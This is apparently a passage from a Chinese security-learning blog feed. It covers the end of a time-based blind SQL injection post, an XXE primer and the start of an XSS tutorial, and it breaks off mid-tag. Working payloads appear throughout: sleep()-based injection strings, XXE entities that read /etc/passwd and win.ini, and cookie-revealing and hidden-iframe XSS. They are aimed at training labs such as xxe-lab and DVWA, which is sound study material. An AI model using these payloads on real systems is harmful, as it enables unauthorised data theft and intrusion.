src="https://img-blog.csdnimg.cn/2020031114221240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>由于目标计算机积极拒绝，无法连接。这个网上说啥的都有，然后我就又懵B了，什么添加端口监视服务的什么乱七八糟的。给我整得头大。<br>然后，解决办法呢，就是看看文件头改了没，url改了没。仅此而已……<br>文件头<br><img src="https://img-blog.csdnimg.cn/20200311133838914.png" loading="lazy"><br>这个在源码里可以找到，随便找个网站就可以，这里我拿百度当例子；f12,再点network<br><img src="https://img-blog.csdnimg.cn/20200311140749527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>随便选择一个，点开，在最下方找到<code>User-agent</code><br><img src="https://img-blog.csdnimg.cn/20200311140056825.png" alt="在这里插入图片描述" loading="lazy"><br>还有其他的办法，用burp抓包，也是随便找个网站抓包，还拿百度来试验；<br><img src="https://img-blog.csdnimg.cn/20200311141538383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个也可以。两种办法，任意选择。<br>好了，这下就可以跑脚本了。<br>脚本大意：<br><code>import</code>作用是导入。<br>可以用来导入一个数据，或者一个库。在这里，就是导入库的意思，在这里导入requests、time、string、sys这几个库。<br><code>header</code>跟http协议有关，请求头，里面包含的是请求头信息。而这个信息我们可以找到我们电脑的按照上面那两个方法。<br><code>global length</code> 说明length是个全局变量，如果想要为一个定义在函数外的变量赋值，那么就得告诉Python这个变量名不是局部的，而是 全局 的。我们使用global语句完成这一功能。没有global语句，是不可能为定义在函数外的变量赋值的。<br>一个循环<code>for l in range(1,20)</code>一般的数据库名长度不会大于20，这里用20就可以了，太大的跑的时间太长。在<code>lengthUrl</code>里添加SQL语句，然后format函数是一个格式化函数，具体作用不再多说。<br><code>start_time()</code>是设置的最初始的时间，如果加载好网页所用的时间减去初始时间大于2.5s了，网页加载有延迟了，那么就证明这个是对的。然后就打印结果的长度。<br>又是一个循环，这个是爆数据库名了，<code>order()</code>函数将ASCII码转换为数字，下面再次更改url，还是设置一个初始时间，因为在开始的时候，设置了resualt,所以这里就每得出一个结果，就加上之前的字符串，打印出来。最后再打印出来最后一次循环的结果。<br>这就是我个人对这个脚本的理解，如果有不对的地方请大佬指正。</p><h5 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h5><p>看下题：<br><img src="https://img-blog.csdnimg.cn/20200309221057600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这张图片哈哈哈，专门截进来，我喜欢这个。🤣🤣🤣🤣<br>开始解题：先f12看看有没有什么信息（😂😂这里一般会有点提示的），找到了，注释………………<br><img src="https://img-blog.csdnimg.cn/20200309221306587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>嗯，这里我用burp抓包了，先抓包，<br>抓到之后，改成这样：</p><pre class="language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>qwzf' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+&amp;password=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200309224359350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里用单引号加载延迟了5秒，可以判断闭合符号是单引号。<br>2.判断库的长度。</p><pre class="language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>qwzf<span class="token string">' and if(length(database())='</span><span class="token number">10</span>'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+&amp;password=</span></code></pre><p>使用二分法比较快。<br><img src="https://img-blog.csdnimg.cn/20200309224051707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>数据库的长度出来了，是10。<br>然后可以用burp来一个一个猜库名，也比手注要省力。</p><pre class="language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>qwzf' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">99</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+&amp;password=qwzf</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200312192120919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看那个箭头指的地方，那是网页加载的时间吗，可以根据那里进行判断。其他就不再废话了。<br>我原本想着burp应该可以直接爆这些库名什么的。可是我不会，我一直以为是我操作的问题，就一直查啊，看了好多博客，都没有人用burp去爆破，今天聊天的时候，我问了一下，这个只能一个一个判断，没有省事的办法，然后我就不纠结了。这个问题烦了我两天。这个都是用脚本跑的。就这样吧，白白纠结了两天。啥也不是。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞基础及简单利用</title>
      <link href="/posts/9b6d5c22/"/>
      <url>/posts/9b6d5c22/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习XXE，其实前段时间写过一篇关于XXE的，但是由于不可描述的原因，我那篇博客原稿没有了。再总结一次，这次做好了备份。</p><h1 id="XXE基础"><a href="#XXE基础" class="headerlink" title="XXE基础"></a>XXE基础</h1><h2 id="xxe概念"><a href="#xxe概念" class="headerlink" title="xxe概念"></a>xxe概念</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>，也就是xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p><h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML指可扩展标记语言。<br>XML被设计用来传输和存储数据。<br>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构。<br>语法规则：</p><pre class="language-xml" data-language="xml"><code class="language-xml">XML文档必须有一个根元素XML元素都必须有一个关闭标签XML标签对大小写敏感XML元素必须被正确的嵌套XML属性必须加引导</code></pre><p>一个XML样例看一下</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>m0re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>best xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Do you know xml?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>可以通过浏览器访问来检查一下上面的规则。比如标签的字母大小写修改一下还能不能和解析成功。</p><h3 id="实体引用："><a href="#实体引用：" class="headerlink" title="实体引用："></a>实体引用：</h3><p><img src="https://img-blog.csdnimg.cn/202007251045012.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>实体引用是因为在浏览器中直接使用这几个符号可能无法成功打印出来，可能会有歧义，所以就需要实体引用起作用了。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD的作用是定义XML文档的合法构建模块<br>DTD可以在XML文档内声明，也可以外部引用。<br>DTD的属性如下<br><img src="https://img-blog.csdnimg.cn/20200725183109307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>示例：</p><ol><li>内部声明：<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from.heading,body)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>m0re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>best xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Do you kmow xml?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre></li><li>外部引用<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"note.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>m0re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>best xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Do you kmow xml?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--note.dtd--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from.heading,body)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></code></pre>默认属性值：<br><img src="https://img-blog.csdnimg.cn/20200725183248162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>两种方式是一样的，其实不加<code>&lt;!ELEMENT note (to,from.heading,body)&gt;</code>这个也是可以显示出来相同的内容，这里的例子知识为了说明这两种引用方式一样。<br>这个是本地的，但是如果是允许web引用包含的话，危害就比较大了。</li></ol><p>外部声明默认协议及PHP扩展协议<br><img src="https://img-blog.csdnimg.cn/20200725162723426.png" alt="m0re" loading="lazy"><br>其中PHP支持的伪协议较多。</p><h2 id="XXE文件读取"><a href="#XXE文件读取" class="headerlink" title="XXE文件读取"></a>XXE文件读取</h2><p>通过XML写入命令，提交XML可在存在XXE漏洞的环境中</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mail</span><span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">mail</span> <span class="token attr-name">(message)</span><span class="token punctuation">></span></span>&lt;!ENTITY hacker SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mail</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mail</span><span class="token punctuation">></span></span></code></pre><p><code>&lt;!ENTITY hacker SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>外部实体说明<br><code>&amp;hacker;</code>是在xml文档中被引用。</p><p>如果题中给了文件路径，那就更容易了，直接读取就可以了。</p><h3 id="xxe-lab"><a href="#xxe-lab" class="headerlink" title="xxe-lab"></a>xxe-lab</h3><p>项目地址——🍗<a href="https://github.com/c0ny1/xxe-lab">传送门</a><br>安装过程出点差错，phpstudy配制出错了，然后搭建的时候报错</p><pre class="language-bash" data-language="bash"><code class="language-bash">You don<span class="token string">'t have permission to access /xxe-lab/ on this server.'</span></code></pre><p>解决办法——🍖<a href="https://blog.csdn.net/qq_39188306/article/details/80682445">已解决</a><br><img src="https://img-blog.csdnimg.cn/20200725150304919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h3 id="XXE简单利用"><a href="#XXE简单利用" class="headerlink" title="XXE简单利用"></a>XXE简单利用</h3><p>一般XXE利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为<code>blind xxe</code>可以使用外带数据通道提取数据<br>xxe-lab是有回显的。<br>查看xxe-lab的PHP源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>可以从这里看出是XXE漏洞注入，而且是POST方式请求。<br>可以抓包查看<br><img src="https://img-blog.csdnimg.cn/20200725173828277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>构造payload</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">m0re</span><span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">m0re</span> <span class="token attr-name">(message)</span><span class="token punctuation">></span></span>&lt;!ENTITY hacker SYSTEM "file:///C:/windows/win.ini"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>m0re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>使得构造的payload在username输出就行了。<br>结果<br><img src="https://img-blog.csdnimg.cn/20200725174143482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个就是很简单的XXE漏洞利用，读取文件，这个是可以读取任意文件的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这是对XXE漏洞基础的了解，以后遇到再进行深入学习。✊</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击原理</title>
      <link href="/posts/73d32882/"/>
      <url>/posts/73d32882/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>跨站脚本（cross site script）为了避免与样式CSS混淆，所以简称xss。<br>xss是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。<br>xss是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料，利用用户身份进行某种动作，或者对访问者进行病毒侵害的一种攻击方式。</p><p>xss攻击的危害包括：<br>1.盗取各类用户账号，如机器登陆账号、用户网银账号、各类管理员账号<br>2.控制企业数据、包括读取、篡改、添加。删除企业敏感数据的能力。<br>3.非法转账，网站挂马，强制发送电子邮件，控制受害者机器向<br>其他网站发起攻击。</p><h3 id="xss主要分类"><a href="#xss主要分类" class="headerlink" title="xss主要分类"></a>xss主要分类</h3><p>反射型XSS（Reflected XSS ），又称为非持久性跨站点脚本攻击，它是最常见类型的xss，漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性xss包含一个带xss攻击向量的链接，（即每次攻击需要用户的点击）。</p><p>存储型XSS（Stored XSS）又称为持久型跨站点攻击脚本，它一般发生在XSS攻击向量（一般指XSS攻击代码）存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久型的XSS相比非持久型的XSS攻击危害更大，因为每当用户打开页面，查看内容时，脚本将自动执行。</p><h1 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h1><p>1.常用HTML标签<br><img src="https://img-blog.csdnimg.cn/20200316231726332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>2.常用JavaScript方法<br><img src="https://img-blog.csdnimg.cn/20200316232703349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>3.构造XSS脚本<br>**<em>弹窗警告**</em><br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<code>&lt;&gt;    /</code>这样就可以证明，这个页面位置存在了XSS漏洞。我将代码写下来然后展示下在DVWA上的运行结果。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>第一个运行结果成功弹了个窗，上面写着xss<br><img src="https://img-blog.csdnimg.cn/20200318182559780.png" alt="Augenstern" loading="lazy"><br>第二个运行结果能把cookie给显示出来<br><img src="https://img-blog.csdnimg.cn/20200318182913584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>**<em>页面嵌套**</em></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>zxcv0221<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io width<span class="token operator">=</span><span class="token number">300</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>zxcv0221<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io width<span class="token operator">=</span><span class="token number">0</span> height<span class="token operator">=</span><span class="token number">0</span> border<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span></code></pre><p>第一个运行结果，我是让它跳到了我的GitHub博客去了。<br><img src="https://img-blog.csdnimg.cn/20200318183201453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" 